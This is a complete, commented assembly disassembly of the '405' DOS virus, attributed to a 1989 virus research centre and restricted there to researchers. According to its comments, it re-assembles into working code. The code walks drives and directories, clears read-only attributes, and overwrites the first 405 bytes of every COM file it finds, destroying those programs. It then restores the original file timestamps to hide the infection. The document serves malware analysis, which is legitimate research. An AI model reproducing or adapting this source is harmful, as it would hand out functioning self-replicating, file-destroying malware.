	title	The '405' virus
	page	65,132
; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 British Computer Virus Research Centre                   บ
; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ
; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ
; บ                                                                          บ
; บ                             The '405' Virus                              บ
; บ                Disassembled by Joe Hirst,      March 1989                บ
; บ                                                                          บ
; บ                      Copyright (c) Joe Hirst 1989.                       บ
; บ                                                                          บ
; บ      This listing is only to be made available to virus researchers      บ
; บ                or software writers on a need-to-know basis.              บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

	; The virus overwrites the first 405 bytes of a COM file.  If the
	; length of the COM file is less than this, the length is increased
	; to 405 bytes.

	; The disassembly has been tested by re-assembly using MASM 5.0.

BUFFER	SEGMENT AT 0

	ORG	295H
DW0295	DW	?
DB0297	DB	?

	ORG	0E000H
DWE000	DW	?			; Read buffer area

	ORG	0E195H
DWE195	DW	?			; Program after virus

BUFFER	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:NOTHING,ES:BUFFER

VIRLEN	EQU	OFFSET ENDADR-START
	ORG	100H

START:	XCHG	SI,AX
	ADD	[BX+SI],AL
	SAHF
	ADD	[BX+SI],AL
	NOP

	MOV	AX,0			; Clear register
	MOV	ES:DB0249,AL		; Set current disk to default
	MOV	ES:DB024B,AL		; Set pathname store to zero
	MOV	ES:DB028B,AL		; Set number of drives to zero
	PUSH	AX
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	ES:DB0249,AL		; Save current disk
	MOV	AH,47H			; Get current directory function
	ADD	AL,1			; Next drive (A)
	PUSH	AX
	MOV	DL,AL			; Drive A
	LEA	SI,DB024B		; Pathname store
	INT	21H			; DOS service
	POP	AX
	MOV	AH,0EH			; Select disk function
	SUB	AL,1			; Convert drive for select function
	MOV	DL,AL			; Move drive
	INT	21H			; DOS service
	MOV	ES:DB028B,AL		; Save number of drives
BP0139:	MOV	AL,ES:DB0249		; Get current disk
	CMP	AL,0			; Is drive A?
	JNZ	BP0152			; Branch if not
	MOV	AH,0EH			; Select disk function
	MOV	DL,2			; Change drive to B
	INT	21H			; DOS service
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	ES:DB024A,AL		; Save new current drive
	JMP	BP0179

BP0152:	CMP	AL,1			; Is drive B?
	JNZ	BP0167			; Branch if not
	MOV	AH,0EH			; Select disk function
	MOV	DL,2			; Change drive to C
	INT	21H			; DOS service
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	ES:DB024A,AL		; Save new current drive
	JMP	BP0179

BP0167:	CMP	AL,2			; Is drive C?
	JNZ	BP0179			; Branch if not
	MOV	AH,0EH			; Select disk function
	MOV	DL,0			; Change drive to A
	INT	21H			; DOS service
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	ES:DB024A,AL		; Save new current drive
BP0179:	MOV	AH,4EH			; Find first file function
	MOV	CX,1			; Find read-only files, not system
	LEA	DX,DB028C		; Path '*.COM'
	INT	21H			; DOS service
	JB	BP0189			; Branch if error
	JMP	BP01A9			; Process COM file

BP0189:	MOV	AH,3BH			; Change current directory function
	LEA	DX,DB0297		; Directory pathname (this is past the end)
	INT	21H			; DOS service
	MOV	AH,4EH			; Find first file function
	MOV	CX,0011H		; Find directory and read-only
	LEA	DX,DB0292		; Path '*'
	INT	21H			; DOS service
	JB	BP0139			; Branch if error
	JMP	BP0179			; Find a COM file

BP01A0:	MOV	AH,4FH			; Find next file function
	INT	21H			; DOS service
	JB	BP0189			; Branch if error
	JMP	BP01A9			; Process COM file

	; Process COM file

BP01A9:	MOV	AH,3DH			; Open handle function
	MOV	AL,2			; R/W access
	MOV	DX,009EH		; File pathname
	INT	21H			; DOS service
	MOV	BX,AX			; Move handle
	MOV	AH,3FH			; Read handle function
	MOV	CX,VIRLEN		; Length of virus
	NOP
	MOV	DX,OFFSET DWE000	; Read it in way down there
	NOP
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	MOV	BX,DWE000		; Get first word of COM file
	CMP	BX,9600H		; Is it infected? (should be 0096H)
	JZ	BP01A0			; Yes, find another one
	MOV	AH,43H			; \ Get file attributes function
	MOV	AL,0			; /
	MOV	DX,009EH		; File pathname
	INT	21H			; DOS service
	MOV	AH,43H			; \ Set file attributes function
	MOV	AL,1			; /
	AND	CX,00FEH		; Set off read only attribute
	INT	21H			; DOS service
	MOV	AH,3DH			; Open handle function
	MOV	AL,2			; R/W mode
	MOV	DX,009EH		; File pathname
	INT	21H			; DOS service
	MOV	BX,AX			; Move handle
	MOV	AH,57H			; \ Get file date & time function
	MOV	AL,0			; /
	INT	21H			; DOS service
	PUSH	CX
	PUSH	DX
	ASSUME	ES:NOTHING
	MOV	DX,CS:DW0295		; Get word after virus here
	MOV	CS:DWE195,DX		; Move to same position in prog
	MOV	DX,CS:DWE000+1		; Get displacement from initial jump
	LEA	CX,DB0294-100H		; Length of virus minus one
	SUB	DX,CX
	MOV	CS:DW0295,DX		; Store in word after virus
	MOV	AH,40H			; Write handle function
	MOV	CX,VIRLEN		; Length of virus
	NOP
	LEA	DX,START		; Beginning of virus
	INT	21H			; DOS service
	MOV	AH,57H			; \ Set file date & time function
	MOV	AL,1			; /
	POP	DX
	POP	CX
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	MOV	DX,CS:DWE195		; Get word after virus
	MOV	CS:DW0295,DX		; Move to same position here
	JMP	BP0234

BP0234:	MOV	AH,0EH			; Select disk function
	MOV	DL,CS:DB0249		; Get current disk
	INT	21H			; DOS service
	MOV	AH,3BH			; Change current directory function
	LEA	DX,DB024A		; Address of path - this is incorrect
	INT	21H			; DOS service
	MOV	AH,0			; Terminate program function
	INT	21H			; DOS service

DB0249	DB	2			; Current disk
DB024A	DB	0			; New current drive

	; There should be an extra byte at this point containing '\'
	; for use by the change directory function - this is why that
	; function is pointing at the previous field

DB024B	DB	'TEST', 3CH DUP (0)
DB028B	DB	0DH			; Number of drives
DB028C	DB	'*.COM', 0
DB0292	DB	'*', 0
DB0294	DB	0E9H

ENDADR	EQU	$

CODE	ENDS

	END	START
